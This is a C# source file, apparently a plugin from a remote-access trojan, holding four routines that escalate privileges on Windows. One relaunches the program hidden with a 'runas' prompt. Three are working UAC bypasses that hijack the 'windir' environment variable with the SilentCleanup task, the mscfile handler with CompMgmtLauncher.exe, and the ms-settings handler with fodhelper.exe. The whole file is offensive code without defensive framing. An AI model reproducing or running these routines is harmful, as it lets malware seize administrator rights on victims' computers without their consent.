using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Plugin.Handler
{
    public class HandleUAC
    {
        public HandleUAC()
        {
            if (Methods.IsAdmin()) return;
  
            try
            {
                Process proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = "/k START \"\" \"" + Process.GetCurrentProcess().MainModule.FileName + "\" & EXIT",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Verb = "runas",
                        UseShellExecute = true
                    }
                };
                proc.Start();
                Methods.ClientExit();
                Environment.Exit(0);
            }
            catch{}
        }


    }
    public class HandleUACbypass
    {
        public HandleUACbypass()
        {
            if (Methods.IsAdmin()) return;

            try
            {
                Microsoft.Win32.RegistryKey key;
                key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Environment");
                key.SetValue("windir", @"cmd.exe " + @"/k START " + Process.GetCurrentProcess().MainModule.FileName + " & EXIT");
                key.Close();

                Process process = new Process();
                process.StartInfo.FileName = "schtasks.exe";
                process.StartInfo.Arguments = "/run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I";
                process.Start();
                
                Methods.ClientExit();
                Environment.Exit(0);
            }
            catch{}
        }


    }

    
    public class HandleUACbypass2
    {

        [DllImport("kernel32.dll")]
        public static extern int WinExec(string exeName, int operType);


        public HandleUACbypass2()
        {
            if (Methods.IsAdmin()) return;

            try
            {
                RegistryKey key;
                RegistryKey command;
                key = Registry.CurrentUser;
                command = key.CreateSubKey(@"Software\Classes\mscfile\shell\open\command");
                command = key.OpenSubKey(@"Software\Classes\mscfile\shell\open\command", true);
                command.SetValue("", Process.GetCurrentProcess().MainModule.FileName);
                key.Close();



                var system = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                var filePath = system + @"\System32\CompMgmtLauncher.exe";
                WinExec(@"cmd.exe /k START " + filePath, 0);
                Thread.Sleep(0);                

                //Registry.CurrentUser.OpenSubKey("Software", true).OpenSubKey("Classes", true).DeleteSubKeyTree("mscfile");
                Thread.Sleep(1000);
                Methods.ClientExit();
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }


    }

    public class HandleUACbypass3
    {
        [DllImport("kernel32.dll")]
        public static extern int WinExec(string exeName, int operType);

        public HandleUACbypass3()
        {
            
            if (Methods.IsAdmin()) return;

            try
            {
                RegistryKey key;
                RegistryKey command;
                key = Registry.CurrentUser;
                command = key.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
                command = key.OpenSubKey(@"Software\Classes\ms-settings\shell\open\command", true);
                command.SetValue("", Process.GetCurrentProcess().MainModule.FileName);
                command.SetValue("DelegateExecute", "");
                key.Close();


                var system = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                var filePath = system + @"\System32\fodhelper.exe";
                WinExec(@"cmd.exe /k START " + filePath, 0);
                Thread.Sleep(0);

                //Registry.CurrentUser.OpenSubKey("Software", true).OpenSubKey("Classes", true).DeleteSubKeyTree("ms-settings");
                
                Methods.ClientExit();
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }
    }    
}
